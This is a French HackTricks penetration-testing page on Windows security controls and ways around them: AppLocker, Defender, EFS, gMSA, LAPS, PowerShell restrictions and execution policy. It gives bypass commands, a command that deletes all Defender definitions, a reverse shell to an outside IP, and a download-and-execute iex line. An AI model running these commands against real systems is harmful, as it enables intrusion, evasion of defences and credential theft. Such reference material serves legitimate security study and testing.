# Contrôles de sécurité Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour créer et **automatiser facilement des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Politique AppLocker

Une liste blanche d'applications est une liste d'applications logicielles ou d'exécutables approuvés qui sont autorisés à être présents et à s'exécuter sur un système. L'objectif est de protéger l'environnement contre les logiciels malveillants nocifs et les logiciels non approuvés qui ne correspondent pas aux besoins spécifiques d'une organisation.&#x20;

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) est la solution de **liste blanche d'applications** de Microsoft et donne aux administrateurs système le contrôle sur **les applications et les fichiers que les utilisateurs peuvent exécuter**. Il offre un **contrôle granulaire** sur les exécutables, les scripts, les fichiers d'installation Windows, les DLL, les applications empaquetées et les installateurs d'applications empaquetées. \
Il est courant que les organisations **bloquent cmd.exe et PowerShell.exe** et l'accès en écriture à certains répertoires, **mais tout cela peut être contourné**.

### Vérification

Vérifiez quels fichiers/extensions sont sur liste noire/liste blanche :
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Les règles AppLocker appliquées à un hôte peuvent également être **lues à partir du registre local** à l'emplacement **`HKLM\Software\Policies\Microsoft\Windows\SrpV2`**.

### Contournement

* Dossiers **inscriptibles** utiles pour contourner la politique AppLocker : Si AppLocker autorise l'exécution de n'importe quoi à l'intérieur de `C:\Windows\System32` ou `C:\Windows`, il existe des **dossiers inscriptibles** que vous pouvez utiliser pour **contourner cela**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Les binaires **"LOLBAS"** couramment **fiables** peuvent également être utiles pour contourner AppLocker.
* Les règles mal écrites peuvent également être contournées.
* Par exemple, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, vous pouvez créer un **dossier appelé `allowed`** n'importe où et il sera autorisé.
* Les organisations se concentrent souvent sur le blocage de l'exécutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`, mais oublient les **autres emplacements** [**d'exécutable PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) tels que `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
* L'application des DLL est très rarement activée en raison de la charge supplémentaire qu'elle peut mettre sur un système et de la quantité de tests nécessaires pour s'assurer que rien ne se cassera. Ainsi, l'utilisation de DLL comme portes dérobées aidera à contourner AppLocker.
* Vous pouvez utiliser [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) pour exécuter du code Powershell dans n'importe quel processus et contourner AppLocker. Pour plus d'informations, consultez : [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Stockage des informations d'identification

### Security Accounts Manager (SAM)

Les informations d'identification locales sont présentes dans ce fichier, les mots de passe sont hachés.

### Autorité de sécurité locale (LSA) - LSASS

Les **informations d'identification** (hachées) sont **enregistrées** dans la **mémoire** de ce sous-système pour des raisons de connexion unique.\
LSA administre la **politique de sécurité** locale (politique de mot de passe, autorisations des utilisateurs...), l'**authentification**, les **jetons d'accès**...\
LSA sera celui qui **vérifiera** les informations d'identification fournies dans le fichier **SAM** (pour une connexion locale) et **communiquera** avec le **contrôleur de domaine** pour authentifier un utilisateur de domaine.

Les **informations d'identification** sont **enregistrées** à l'intérieur du processus LSASS : tickets Kerberos, hachages NT et LM, mots de passe facilement déchiffrables.

### Secrets LSA

LSA peut enregistrer sur le disque certaines informations d'identification :

* Mot de passe du compte de l'ordinateur du domaine Active Directory (contrôleur de domaine inaccessible).
* Mots de passe des comptes des services Windows.
* Mots de passe pour les tâches planifiées.
* Plus encore (mot de passe des applications IIS...).

### NTDS.dit

Il s'agit de la base de données de l'Active Directory. Elle n'est présente que dans les contrôleurs de domaine.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) est un antivirus disponible dans Windows 10 et Windows 11, ainsi que dans les versions de Windows Server. Il **bloque** les outils de pentest courants tels que **`WinPEAS`**. Cependant, il existe des moyens de **contourner ces protections**.

### Vérification

Pour vérifier l'état de **Defender**, vous pouvez exécuter la commande PS **`Get-MpComputerStatus`** (vérifiez la valeur de **`RealTimeProtectionEnabled`** pour savoir s'il est actif) :

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :</code></pre>

Pour l'énumérer, vous pouvez également exécuter :
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## EFS (Système de fichiers chiffré)

EFS fonctionne en chiffrant un fichier avec une **clé symétrique** en vrac, également appelée clé de chiffrement de fichier ou **FEK**. Le FEK est ensuite **chiffré** avec une **clé publique** associée à l'utilisateur qui a chiffré le fichier, et ce FEK chiffré est stocké dans le **flux de données alternatif** $EFS du fichier chiffré. Pour déchiffrer le fichier, le pilote du composant EFS utilise la **clé privée** qui correspond au certificat numérique EFS (utilisé pour chiffrer le fichier) pour déchiffrer la clé symétrique qui est stockée dans le flux $EFS. À partir de [ici](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

Exemples de fichiers déchiffrés sans que l'utilisateur ne le demande :

* Les fichiers et dossiers sont déchiffrés avant d'être copiés sur un volume formaté avec un autre système de fichiers, comme [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table).
* Les fichiers chiffrés sont copiés via le protocole SMB/CIFS, les fichiers sont déchiffrés avant d'être envoyés via le réseau.

Les fichiers chiffrés selon cette méthode peuvent être **accédés de manière transparente par l'utilisateur propriétaire** (celui qui les a chiffrés), donc si vous pouvez **devenir cet utilisateur**, vous pouvez déchiffrer les fichiers (changer le mot de passe de l'utilisateur et vous connecter en tant que lui ne fonctionnera pas).

### Vérifier les informations EFS

Vérifiez si un **utilisateur** a **utilisé** ce **service** en vérifiant si ce chemin existe : `C:\users\<nom d'utilisateur>\appdata\roaming\Microsoft\Protect`

Vérifiez **qui** a **accès** au fichier en utilisant cipher /c \<fichier>\
Vous pouvez également utiliser `cipher /e` et `cipher /d` à l'intérieur d'un dossier pour **chiffrer** et **déchiffrer** tous les fichiers.

### Déchiffrer les fichiers EFS

#### En étant l'autorité système

Cette méthode nécessite que l'**utilisateur victime** exécute un **processus** à l'intérieur de l'hôte. Si c'est le cas, en utilisant une session `meterpreter`, vous pouvez vous faire passer pour le jeton du processus de l'utilisateur (`impersonate_token` de `incognito`). Ou vous pouvez simplement vous `migrer` vers le processus de l'utilisateur.

#### Connaître le mot de passe de l'utilisateur

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Comptes de service gérés par groupe (gMSA)

Dans la plupart des infrastructures, les comptes de service sont des comptes utilisateur classiques avec l'option "**Mot de passe jamais expiré**". La gestion de ces comptes peut être un vrai casse-tête, c'est pourquoi Microsoft a introduit les **comptes de service gérés** :

* Plus de gestion de mot de passe. Il utilise un mot de passe complexe, aléatoire et de 240 caractères qui change automatiquement lorsqu'il atteint la date d'expiration du mot de passe du domaine ou de l'ordinateur.
* Il utilise le service de distribution de clés (KDC) de Microsoft pour créer et gérer les mots de passe des gMSA.
* Il ne peut pas être verrouillé ni utilisé pour une connexion interactive.
* Prise en charge du partage sur plusieurs hôtes.
* Peut être utilisé pour exécuter des tâches planifiées (les comptes de service gérés ne prennent pas en charge l'exécution de tâches planifiées).
* Gestion simplifiée des SPN - Le système changera automatiquement la valeur du SPN si les détails de **sAMaccount** de l'ordinateur changent ou si la propriété du nom DNS change.

Les comptes gMSA stockent leurs mots de passe dans une propriété LDAP appelée _**msDS-ManagedPassword**_, qui est **automatiquement** réinitialisée par les contrôleurs de domaine toutes les 30 jours, et qui peut être récupérée par les administrateurs autorisés et par les serveurs sur lesquels ils sont installés. _**msDS-ManagedPassword**_ est un bloc de données chiffrées appelé [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) et il n'est récupérable que lorsque la connexion est sécurisée, en utilisant LDAPS ou lorsque le type d'authentification est "Scellement et sécurité", par exemple.

![Image from https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Donc, si gMSA est utilisé, vérifiez s'il a des **privilèges spéciaux** et vérifiez également si vous avez les **permissions** pour **lire** le mot de passe des services.

Vous pouvez lire ce mot de passe avec [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
De plus, consultez cette [page web](https://cube0x0.github.io/Relaying-for-gMSA/) sur la façon d'effectuer une attaque de relais NTLM pour lire le mot de passe de gMSA.

## LAPS

****[**Local Administrator Password Solution (LAPS)**](https://www.microsoft.com/en-us/download/details.aspx?id=46899) vous permet de gérer le mot de passe de l'administrateur local (qui est aléatoire, unique et modifié régulièrement) sur les ordinateurs joints au domaine. Ces mots de passe sont stockés de manière centralisée dans Active Directory et restreints aux utilisateurs autorisés à l'aide des ACL. Si votre utilisateur dispose des autorisations suffisantes, vous pourrez peut-être lire les mots de passe des administrateurs locaux.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## Mode de langage PowerShell restreint

PowerShell **** [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **verrouille bon nombre des fonctionnalités** nécessaires pour utiliser PowerShell efficacement, telles que le blocage des objets COM, l'autorisation uniquement des types .NET approuvés, les flux de travail basés sur XAML, les classes PowerShell, et plus encore.

### **Vérification**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Contournement
```powershell
#Easy bypass
Powershell -version 2
```
Dans les versions actuelles de Windows, cette méthode de contournement ne fonctionnera pas, mais vous pouvez utiliser [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).

**Pour le compiler, vous devrez peut-être** **ajouter une référence** -> _Parcourir_ -> _Parcourir_ -> ajouter `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` et **modifier le projet en .Net4.5**.

#### Contournement direct :
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Shell inversé:

A reverse shell is a technique used by attackers to gain remote access to a target system. Instead of the attacker connecting directly to the target, the target system initiates a connection back to the attacker's machine. This allows the attacker to bypass firewalls and other security measures that may be in place.

To establish a reverse shell, the attacker typically exploits a vulnerability in the target system, such as a weak authentication mechanism or a software vulnerability. Once the attacker gains control of the target system, they can execute commands and interact with the system as if they were physically present.

Reverse shells are commonly used in post-exploitation scenarios, where the attacker wants to maintain persistent access to the target system. By establishing a reverse shell, the attacker can easily reconnect to the target system at a later time without having to go through the initial exploitation process again.

It is important for system administrators to be aware of the risks associated with reverse shells and take steps to prevent them. This includes implementing strong authentication mechanisms, keeping software up to date with the latest security patches, and monitoring network traffic for any suspicious activity.
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Vous pouvez utiliser [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) pour **exécuter du code Powershell** dans n'importe quel processus et contourner le mode restreint. Pour plus d'informations, consultez : [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Politique d'exécution de PS

Par défaut, elle est définie sur **restricted**. Les principales façons de contourner cette politique sont :
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Plus d'informations peuvent être trouvées [ici](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Interface de fournisseur de support de sécurité (SSPI)

C'est l'API qui peut être utilisée pour authentifier les utilisateurs.

Le SSPI sera chargé de trouver le protocole adéquat pour deux machines qui souhaitent communiquer. La méthode préférée pour cela est Kerberos. Ensuite, le SSPI négociera le protocole d'authentification qui sera utilisé, ces protocoles d'authentification sont appelés fournisseurs de support de sécurité (SSP), ils sont situés à l'intérieur de chaque machine Windows sous forme de DLL et les deux machines doivent prendre en charge le même pour pouvoir communiquer.

### Principaux SSP

* **Kerberos** : Le préféré
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** et **NTLMv2** : Raisons de compatibilité
* %windir%\Windows\System32\msv1\_0.dll
* **Digest** : Serveurs Web et LDAP, mot de passe sous forme de hachage MD5
* %windir%\Windows\System32\Wdigest.dll
* **Schannel** : SSL et TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate** : Il est utilisé pour négocier le protocole à utiliser (Kerberos ou NTLM, Kerberos étant celui par défaut)
* %windir%\Windows\System32\lsasrv.dll

#### La négociation peut offrir plusieurs méthodes ou une seule.

## UAC - Contrôle de compte d'utilisateur

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui permet une **invite de consentement pour les activités élevées**.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}



<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour créer et **automatiser facilement des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au référentiel [hacktricks](https://github.com/carlospolop/hacktricks) et [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
